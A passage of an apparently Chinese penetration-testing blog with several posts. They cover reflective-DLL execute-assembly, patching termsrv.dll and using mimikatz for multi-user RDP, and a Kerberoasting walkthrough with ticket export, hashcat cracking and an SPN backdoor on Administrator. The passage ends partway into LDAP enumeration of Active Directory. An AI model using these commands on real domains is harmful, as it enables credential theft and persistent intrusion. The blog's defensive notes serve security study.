</ul>

<p>第一种利用思路要优于第二种，完整的利用过程如下：</p>

<ol>
  <li>创建一个正常的进程</li>
  <li>通过Dll反射向进程注入dll</li>
  <li>dll实现从内存中读取shellcode并加载最终的.NET程序集</li>
</ol>

<p>优点如下：</p>

<ul>
  <li>整个过程在内存执行，不写入文件系统</li>
  <li>Payload以dll形式存在，不会产生可疑的进程</li>
  <li>最终的Payload为C#程序，现有的Powershell利用脚本转换为C#代码很方便</li>
</ul>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>整个利用过程必须要用到dll注入，可以对常见的dll注入方法(尤其是Dll反射)进行拦截</p>

<p>而对于dll本身，在使用CLR时，会加载系统的dll，例如：</p>

<ul>
  <li>mscoree.dll</li>
  <li>mscoreei.dll</li>
  <li>mscorlib.dll</li>
</ul>

<p>可对此进行监控</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文结合多个开源代码，总结了”execute-assembly”的实现方法和利用思路，分析优点，最后给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 19, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows系统远程桌面的多用户登录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。</p>

<p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效</p>

<p>那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>开启远程桌面的方法</li>
  <li>使用mimikatz支持远程桌面多用户的原理</li>
  <li>改进思路</li>
  <li>测试工具rdpwrap</li>
</ul>

<h2 id="0x02-开启远程桌面的方法">0x02 开启远程桌面的方法</h2>
<hr>

<h3 id="1查询系统是否允许3389远程连接">1、查询系统是否允许3389远程连接</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
</code></pre></div></div>

<p>1表示关闭，0表示开启</p>

<p>查看远程连接的端口：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
</code></pre></div></div>

<p>端口格式为16进制，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/2-1.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">0xd3d</code>转换为十进制为<code class="language-plaintext highlighter-rouge">33389</code></p>

<h3 id="2本机开启3389远程连接的方法">2、本机开启3389远程连接的方法</h3>

<h4 id="方法1通过cmd">方法1：通过cmd</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
</code></pre></div></div>

<h4 id="方法2通过reg文件">方法2：通过reg文件</h4>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
"fDenyTSConnections"=dword:00000000
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
"PortNumber"=dword:00000d3d
</code></pre></div></div>

<p>导入注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regedit /s a.reg
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果修改连接端口，系统重启后才能生效</p>

<p><strong>补充</strong></p>

<p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/2-2.png" alt="Alt text"></p>

<p>修改防火墙配置，允许3389端口的命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
</code></pre></div></div>

<h3 id="3远程连接方法">3、远程连接方法</h3>

<p>kali使用3389远程连接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop 192.168.1.1:3389
</code></pre></div></div>

<p>Windows：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstsc.exe
</code></pre></div></div>

<h2 id="0x03-非服务器版本的windows系统默认只允许一个账户登录">0x03 非服务器版本的Windows系统默认只允许一个账户登录</h2>
<hr>

<p>具体表现为：</p>

<p>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/3-1.png" alt="Alt text"></p>

<p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/3-2.png" alt="Alt text"></p>

<p>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/3-3.png" alt="Alt text"></p>

<h2 id="0x04--非服务器版本的windows系统支持多用户登录的方法">0x04  非服务器版本的Windows系统支持多用户登录的方法</h2>
<hr>

<h3 id="1使用mimikatz">1、使用mimikatz</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
ts::multirdp
</code></pre></div></div>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/4-1.png" alt="Alt text"></p>

<p>开启多用户登录功能，最高支持到Win7</p>

<p><strong>使用与原系统相同的账户，原系统还是会被切换到登录界面</strong></p>

<p>使用与原系统不同的账户，登录成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/4-2.png" alt="Alt text"></p>

<p>通过查看mimikatz的源码找到修改思路，代码位置如下：</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c</p>

<p>Windows在开启服务Remote Desktop Services时，会加载termsrv.dll，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/4-3.png" alt="Alt text"></p>

<p>通过修改内存中的termsrv.dll实现开启多用户功能，具体操作如下：</p>

<p>Win7 x86：</p>

<p>查找:<code class="language-plaintext highlighter-rouge">0x3B86200300000F84</code></p>

<p>替换为:<code class="language-plaintext highlighter-rouge">0xC78620030000FFFFFF7F9090</code></p>

<p>Win7 x64：</p>

<p>查找:<code class="language-plaintext highlighter-rouge">0x39873C0600000F84</code></p>

<p>替换为:<code class="language-plaintext highlighter-rouge">0xC7873C060000FFFFFF7F9090</code></p>

<p>当然，该方法在系统重启后失效</p>

<p>更近一步，如果我们直接修改文件termsrv.dll，能否实现永久开启多用户登录的功能呢？</p>

<p>继续接下来的测试</p>

<h3 id="2修改termsrvdll">2、修改termsrv.dll</h3>

<p>推荐工具： <code class="language-plaintext highlighter-rouge">CFF Explorer</code></p>

<p>测试系统： Win7 x64</p>

<p>打开<code class="language-plaintext highlighter-rouge">c：\windows\system32</code>下的termsrv.dll</p>

<p>Hex Editor</p>

<p>查看十六进制数据<code class="language-plaintext highlighter-rouge">39873C0600000F84</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/4-4.png" alt="Alt text"></p>

<p>从<code class="language-plaintext highlighter-rouge">0x0001738A</code>处开始，选中12字节，替换为<code class="language-plaintext highlighter-rouge">C7873C060000FFFFFF7F9090</code></p>

<p>保存dll</p>

<p><strong>注：</strong></p>

<p>需要先停止远程桌面服务才能替换termsrv.dll</p>

<p>替换termsrv.dll后，重新开启服务TermService</p>

<p>尝试使用不同用户远程连接，成功，验证该思路正确</p>

<p>完整操作如下：</p>

<p>1.查看Remote Desktop Services服务状态</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc TermService
</code></pre></div></div>

<p>2.如果服务启动，需要先关闭</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net stop TermService /y
</code></pre></div></div>

<p>3.删除原termsrv.dll</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del c:\windows\system32\termsrv.dll
</code></pre></div></div>

<p>4.替换新termsrv.dll</p>

<p>5.启动服务</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net start TermService
</code></pre></div></div>

<p>6.远程连接</p>

<p>成功实现多用户登录</p>

<p><strong>补充1：</strong></p>

<p>Win7 x86：</p>

<p>查找:<code class="language-plaintext highlighter-rouge">0x3B86200300000F84</code></p>

<p>替换为:<code class="language-plaintext highlighter-rouge">0xC78620030000FFFFFF7F9090</code></p>

<p><strong>补充2</strong></p>

<p>常见Windows系统的版本号：</p>

<table>
  <thead>
    <tr>
      <th>系统</th>
      <th>版本号</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Win7</td>
      <td>6.1.7600</td>
    </tr>
    <tr>
      <td>Win7sp1</td>
      <td>6.1.7601</td>
    </tr>
    <tr>
      <td>Win8</td>
      <td>6.2.9200</td>
    </tr>
    <tr>
      <td>Win8.1</td>
      <td>6.3.9600</td>
    </tr>
  </tbody>
</table>

<h3 id="3使用工具rdpwrap">3、使用工具rdpwrap</h3>

<p>工程地址：</p>

<p>https://github.com/stascorp/rdpwrap</p>

<p>工具地址：</p>

<p>https://github.com/stascorp/rdpwrap/releases</p>

<p>支持Win Vista - Win 10</p>

<p>不修改termsrv.dll，通过传入不同参数实现</p>

<p>安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RDPWInst.exe -i is
</code></pre></div></div>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-1/5-1.png" alt="Alt text"></p>

<p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p>

<p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p>

<p>此时，能够使用不同用户进行远程连接</p>

<p>卸载：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RDPWInst.exe -u
</code></pre></div></div>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了三种支持远程桌面多用户登录的方法，适用于不同条件，对于替换termsrv.dll的方法，需要根据系统具体版本，使用不同的替换位置</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November  1, 2017
  </div>

  
</article><article class="post">
  <h1>域渗透——Kerberoasting</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Kerberoasting是域渗透中经常使用的一项技术，本文将参考公开的资料，结合自己的理解，详细介绍Kerberoasting的原理和实现，以及一个后门利用的方法，最后给出防御建议。</p>

<p>参考资料：</p>

<p>http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</p>

<p>http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/</p>

<p>https://malicious.link/post/2016/kerberoast-pt1/</p>

<p>https://malicious.link/post/2016/kerberoast-pt2/</p>

<p>https://malicious.link/post/2016/kerberoast-pt3/</p>

<p>https://adsecurity.org/?p=3458</p>

<p>https://adsecurity.org/?page_id=183</p>

<p>https://blog.netspi.com/faster-domain-escalation-using-ldap/</p>

<p>https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Kerberoasting相关概念</li>
  <li>Kerberoasting的原理</li>
  <li>Kerberoasting的实现</li>
  <li>Kerberoasting的后门利用</li>
  <li>Kerberoasting的防御</li>
</ul>

<h2 id="0x02-基本概念">0x02 基本概念</h2>
<hr>

<h3 id="spn">SPN</h3>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</p>

<p>全称<code class="language-plaintext highlighter-rouge">Service Principal Names</code></p>

<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>

<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>

<p>当一个服务的权限为<code class="language-plaintext highlighter-rouge">Local System</code>或<code class="language-plaintext highlighter-rouge">Network Service</code>，则SPN注册在机器帐户(Computers)下</p>

<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>

<h3 id="spn的格式">SPN的格式</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>serviceclass/host:port/servicename
</code></pre></div></div>

<p>说明：</p>

<ul>
  <li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
  <li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
  <li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
</ul>

<h3 id="查询spn">查询SPN</h3>

<p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>

<h4 id="1-使用setspn">(1) 使用SetSPN</h4>

<p>Win7和Windows Server2008自带的工具</p>

<p>查看当前域内的所有SPN：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -q */*
</code></pre></div></div>

<p>查看test域内的所有SPN：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -T test -q */*
</code></pre></div></div>

<p>输出结果实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CN=DC1,OU=Domain Controllers,DC=test,DC=com
        exchangeRFR/DC1
        exchangeRFR/DC1.test.com
        exchangeMDB/DC1.test.com
        exchangeMDB/DC1
        exchangeAB/DC1
        exchangeAB/DC1.test.com
        SMTP/DC1
        SMTP/DC1.test.com
        SmtpSvc/DC1
        SmtpSvc/DC1.test.com
        ldap/DC1.test.com/ForestDnsZones.test.com
        ldap/DC1.test.com/DomainDnsZones.test.com
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.test.com
        DNS/DC1.test.com
        GC/DC1.test.com/test.com
        RestrictedKrbHost/DC1.test.com
        RestrictedKrbHost/DC1
        HOST/DC1/TEST
        HOST/DC1.test.com/TEST
        HOST/DC1
        HOST/DC1.test.com
        HOST/DC1.test.com/test.com
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/0f33253b-2314-40f0-b665-f4317b13e6b9/test.com
        ldap/DC1/TEST
        ldap/0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com
        ldap/DC1.test.com/TEST
        ldap/DC1
        ldap/DC1.test.com
        ldap/DC1.test.com/test.com
CN=krbtgt,CN=Users,DC=test,DC=com
        kadmin/changepw
CN=COMPUTER01,CN=Computers,DC=test,DC=com
        RestrictedKrbHost/COMPUTER01
        HOST/COMPUTER01
        RestrictedKrbHost/COMPUTER01.test.com
        HOST/COMPUTER01.test.com
CN=MSSQL Service Admin,CN=Users,DC=test,DC=com
        MSSQLSvc/DC1.test.com
</code></pre></div></div>

<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p>

<p>对于上面的输出数据，机器帐户(Computers)为：</p>

<ul>
  <li>CN=DC1,OU=Domain Controllers,DC=test,DC=com</li>
  <li>CN=COMPUTER01,CN=Computers,DC=test,DC=com</li>
</ul>

<p>域用户帐户(Users)为：</p>

<ul>
  <li>CN=krbtgt,CN=Users,DC=test,DC=com</li>
  <li>CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</li>
</ul>

<p>注册在域用户帐户(Users)下的SPN有两个：<code class="language-plaintext highlighter-rouge">kadmin/changepw</code>和<code class="language-plaintext highlighter-rouge">MSSQLSvc/DC1.test.com</code></p>

<h2 id="0x03-kerberoasting的原理">0x03 Kerberoasting的原理</h2>
<hr>

<h4 id="1kerberos认证过程">1、Kerberos认证过程</h4>

<p>一个简单的Kerberos认证过程如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-1.png" alt="Alt text"></p>

<ol>
  <li>as_request</li>
  <li>as_reply</li>
  <li>tgs_request</li>
  <li>tgs_reply</li>
  <li>ap_request</li>
  <li>ap_reply</li>
</ol>

<p>对于4.tgs_reply，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为<code class="language-plaintext highlighter-rouge">RC4-HMAC</code></p>

<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生成TGS进行比较。如果TGS相同，代表口令正确，就能获得目标服务实例的明文口令</p>

<h4 id="2windows系统通过spn查询获得服务和服务实例帐户的对应关系">2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</h4>

<p>这里举一个例子：</p>

<p>用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下：</p>

<p>(1)Domain Controller查询MySQL服务的SPN</p>

<p>如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</p>

<p>如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</p>

<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>

<h4 id="3域内的主机都能查询spn">3、域内的主机都能查询SPN</h4>

<h4 id="4域内的任何用户都可以向域内的任何服务请求tgs">4、域内的任何用户都可以向域内的任何服务请求TGS</h4>

<p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>

<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>

<p>因此，高效率的利用思路如下：</p>

<ol>
  <li>查询SPN，找到有价值的SPN，需要满足以下条件：
    <ul>
      <li>该SPN注册在域用户帐户(Users)下</li>
      <li>域用户账户的权限很高</li>
    </ul>
  </li>
  <li>请求TGS</li>
  <li>导出TGS</li>
  <li>暴力破解</li>
</ol>

<h2 id="0x04-kerberoasting的实现方法一">0x04 Kerberoasting的实现方法一</h2>
<hr>

<h3 id="1获得有价值的spn">1、获得有价值的SPN</h3>

<p>需要满足以下条件：</p>

<ul>
  <li>该SPN注册在域用户帐户(Users)下</li>
  <li>域用户账户的权限很高</li>
</ul>

<p>可以选择以下三种方法：</p>

<h4 id="1使用powershell模块active-directory">(1)使用powershell模块Active Directory</h4>

<p><strong>注：</strong></p>

<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module ActiveDirectory
get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
</code></pre></div></div>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
</code></pre></div></div>

<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>

<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>

<h4 id="2使用powerview">(2)使用PowerView</h4>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
</code></pre></div></div>

<h4 id="3使用kerberoast">(3)使用kerberoast</h4>

<p>powershell:</p>

<p>https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</p>

<p>vbs:</p>

<p>https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript GetUserSPNs.vbs
</code></pre></div></div>

<h3 id="2请求tgs">2、请求TGS</h3>

<h4 id="1请求指定tgs">(1)请求指定TGS</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SPNName = 'MSSQLSvc/DC1.test.com'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
</code></pre></div></div>

<h4 id="2请求所有tgs">(2)请求所有TGS</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type -AssemblyName System.IdentityModel  
setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
</code></pre></div></div>

<p>执行后输入<code class="language-plaintext highlighter-rouge">klist</code>查看内存中的票据，可找到获得的TGS</p>

<h3 id="3导出">3、导出</h3>

<p>使用mimikatz</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerberos::list /export
</code></pre></div></div>

<h3 id="4破解">4、破解</h3>

<p>https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./tgsrepcrack.py wordlist.txt test.kirbi
</code></pre></div></div>

<h2 id="0x05-kerberoasting的实现方法二">0x05 Kerberoasting的实现方法二</h2>
<hr>

<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>

<p>http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</p>

<p>代码地址：</p>

<p>https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</p>

<p>使用<code class="language-plaintext highlighter-rouge">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>

<p>实例演示：</p>

<p>在域内一台主机上以普通用户权限执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
</code></pre></div></div>

<p>-AdminCount表示选择高权限的用户</p>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png" alt="Alt text"></p>

<p>只提取出hash的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-3.png" alt="Alt text"></p>

<p>使用hashcat破解的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
</code></pre></div></div>

<p>破解结果如下图，成功获得明文口令<code class="language-plaintext highlighter-rouge">MySQLAdmin111!</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p>

<p>https://github.com/GhostPack/Rubeus</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe kerberoast
</code></pre></div></div>

<h2 id="0x06-kerberoasting的后门利用">0x06 Kerberoasting的后门利用</h2>
<hr>

<p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>

<p>例如为域用户<code class="language-plaintext highlighter-rouge">Administrator</code>添加<code class="language-plaintext highlighter-rouge">SPNVNC/DC1.test.com</code>，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -U -A VNC/DC1.test.com Administrator
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/3-1.png" alt="Alt text"></p>

<p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/3-2.png" alt="Alt text"></p>

<p>再使用hashcat破解即可</p>

<p><strong>补充：</strong></p>

<p>删除SPN的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -D VNC/DC1.test.com Administrator
</code></pre></div></div>

<h2 id="0x07-防御">0x07 防御</h2>
<hr>

<p>站在防御的角度，不可能阻止kerberoast，但可以对有攻击价值的SPN(注册在域用户帐户下，权限高)，增加密码长度，能够提高破解难度，并且定期修改关联的域用户口令</p>

<p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p>

<p>下载地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p>参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
</code></pre></div></div>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文对Kerberoasting的原理、方法和防御作了详细介绍，并进行了实例演示。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 15, 2019
  </div>

  
</article><article class="post">
  <h1>渗透基础——活动目录信息的获取</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在域渗透中，活动目录信息的获取必不可少</p>

<p>本文将要以获取活动目录中所有用户、所有计算机和所有组为例，介绍常用的信息获取方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>域外获取活动目录信息的方法</li>
  <li>域内获取活动目录信息的方法</li>
  <li>使用C++调用ADSI接口获取信息的方法</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<p>域环境使用directory database（目录数据库）来存储用户、计算机账户和组等对象</p>

<p>使用LDAP(Lightweight Directory Access Protocol)（轻量目录访问协议）来查询和更新目录数据库</p>

<p>常用缩写词</p>

<ul>
  <li>DN:Distinguished Name</li>
  <li>CN:Common Name</li>
  <li>OU:Organizational Unit</li>
  <li>DC:Domain Controller</li>
</ul>

<p>其中DN有三个属性，分别是CN、OU和DC</p>

<p>简单理解：</p>

<p>域控制器默认会开启端口389，用作LDAP服务</p>

<h2 id="0x03-域外获取活动目录信息的方法">0x03 域外获取活动目录信息的方法</h2>
<hr>

<h3 id="1kali系统通过ldapsearch进行数据查询">1.Kali系统通过ldapsearch进行数据查询</h3>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-1.png" alt="Alt text"></p>

<p>前提：我们能够访问到域控制器(DC)的389端口，并且我们至少已经获得了域内一个普通用户的口令</p>

<p>这个测试环境中，我们获得了域内普通用户<code class="language-plaintext highlighter-rouge">testa</code>的口令为<code class="language-plaintext highlighter-rouge">DomainUser123!</code></p>

<p>连接命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com"
</code></pre></div></div>

<p>参数说明：</p>

<ul>
  <li>-x   进行简单认证</li>
  <li>-H   服务器地址</li>
  <li>-D   用来绑定服务器的DN</li>
  <li>-w   绑定DN的密码</li>
  <li>-b   指定要查询的根节点</li>
</ul>

<p>这条命令会显示所能查询到的所有信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-2.png" alt="Alt text"></p>

<p>接下来加入搜索条件，对结果进行分类</p>

<h4 id="1查询所有域用户">(1)查询所有域用户</h4>

<p>加入搜索条件：<code class="language-plaintext highlighter-rouge">"(&amp;(objectClass=user)(objectCategory=person))"</code></p>

<p>完整命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" -b "DC=test,DC=com" "(&amp;(objectClass=user)(objectCategory=person))"
</code></pre></div></div>

<p>这条命令会输出所有域用户的所有属性，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-3.png" alt="Alt text"></p>

<p>为了便于统计名称，可以选择只列出CN(Common Name)，并且使用<code class="language-plaintext highlighter-rouge">grep</code>命令对输出进行过滤</p>

<p>命令如下：</p>

